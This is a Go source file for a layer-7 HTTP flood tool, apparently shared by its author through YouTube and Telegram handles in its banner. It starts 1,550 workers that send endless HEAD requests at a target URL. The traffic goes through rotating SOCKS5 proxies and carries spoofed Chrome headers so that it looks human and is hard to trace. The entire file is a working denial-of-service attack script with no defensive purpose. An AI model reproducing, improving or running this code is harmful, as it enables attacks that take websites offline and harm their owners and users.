package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

const (
	TendangJin = 1550
	JandaAnak  = 2 * time.Second
)

var BeHa = http.Header{
	"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
	"Accept-Language":           {"en-US,en;q=0.9,id;q=0.8"},
	"Accept-Encoding":           {"gzip, deflate, br"},
	"Connection":                {"keep-alive"},
	"Upgrade-Insecure-Requests": {"1"},
	"Sec-Fetch-Dest":            {"document"},
	"Sec-Fetch-Mode":            {"navigate"},
	"Sec-Fetch-Site":            {"none"},
	"Sec-Fetch-User":            {"?1"},
	"Cache-Control":             {"no-cache"},
	"Pragma":                    {"no-cache"},
	"sec-ch-ua":                 {`"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`},
	"sec-ch-ua-mobile":          {"?0"},
	"sec-ch-ua-platform":        {"Windows"},
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func bacaProxyFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		proxies = append(proxies, line)
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	if len(proxies) == 0 {
		return nil, fmt.Errorf("file proxy.txt kosong")
	}
	return proxies, nil
}

func buatTransportSOCKS5(proxyAddr string) (*http.Transport, error) {
	dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
	if err != nil {
		return nil, err
	}
	return &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			return dialer.Dial(network, addr)
		},
		DisableKeepAlives:   false,
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 5000,
		MaxConnsPerHost:     0,
		IdleConnTimeout:     10 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		ForceAttemptHTTP2:     false,
		DisableCompression:    true,
		TLSHandshakeTimeout:   1 * time.Second,
		ResponseHeaderTimeout: 500 * time.Millisecond,
	}, nil
}

type Crot_Dalam struct {
	id     int
	Tempek string
	client *http.Client
}

func (w *Crot_Dalam) BikinAnak() *http.Request {
	req, err := http.NewRequest("HEAD", w.Tempek, nil)
	if err != nil {
		return nil
	}
	req.Header = BeHa.Clone()
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
	return req
}

func (w *Crot_Dalam) run(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			req := w.BikinAnak()
			if req == nil {
				continue
			}
			resp, err := w.client.Do(req)
			if err == nil {
				resp.Body.Close()
			}
		}
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "Contoh : %s <url>\n", os.Args[0])
		os.Exit(1)
	}
	Tempek := os.Args[1]

	proxies, err := bacaProxyFile("proxy.txt")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Gagal membaca proxy.txt: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("Membaca %d proxy dari proxy.txt\n", len(proxies))

	fmt.Printf("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡾⠃⠀⠀⠀⠀⠀⠀Runing : Termux\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀Server : None\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠻⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀Version : v1.3.0\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⢛⣿⣿⣶⣄⠙⠿⠀⠀⠀⠀⠀⠀⠀⠀Connection : Wifi\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⢀⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀Dns : dns.adguard.com\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⢀⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀Requests By : Golang\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⣼⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀Sumber : go.sum\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Modifikasi : go.mod\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Country : Indonesia\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Device : Redmi-Xiaomi\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Cpu : 8 Core\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀YouTube : DizFlyze999\n")
	fmt.Printf("⠀⠀⠀⠀⣠⣶⡿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Telegram : dizflyzereall\n")
	fmt.Printf("\n🚀 ALL FAST SPAM METHOD\n")
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("+ Threads : %d\n", TendangJin)
	fmt.Printf("+ Target  : %s\n", Tempek)
	fmt.Printf("+ Mode    : Likely Human\n")
	fmt.Printf("+ Ulimit  : 32768\n")
	fmt.Printf("+ Layers  : Seven\n")
	fmt.Printf("+ Proxies : %d (SOCKS5 rotating)\n", len(proxies))
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n\n\n\n\n\n\n")

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	for i := 0; i < TendangJin; i++ {
		proxyAddr := proxies[i%len(proxies)]
		transport, err := buatTransportSOCKS5(proxyAddr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Worker %d: Proxy %s error: %v, skip\n", i, proxyAddr, err)
			continue
		}
		client := &http.Client{
			Transport: transport,
			Timeout:   JandaAnak,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		w := &Crot_Dalam{
			id:     i,
			Tempek: Tempek,
			client: client,
		}
		wg.Add(1)
		go w.run(ctx, &wg)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	fmt.Println("\n")
	cancel()
	wg.Wait()
}
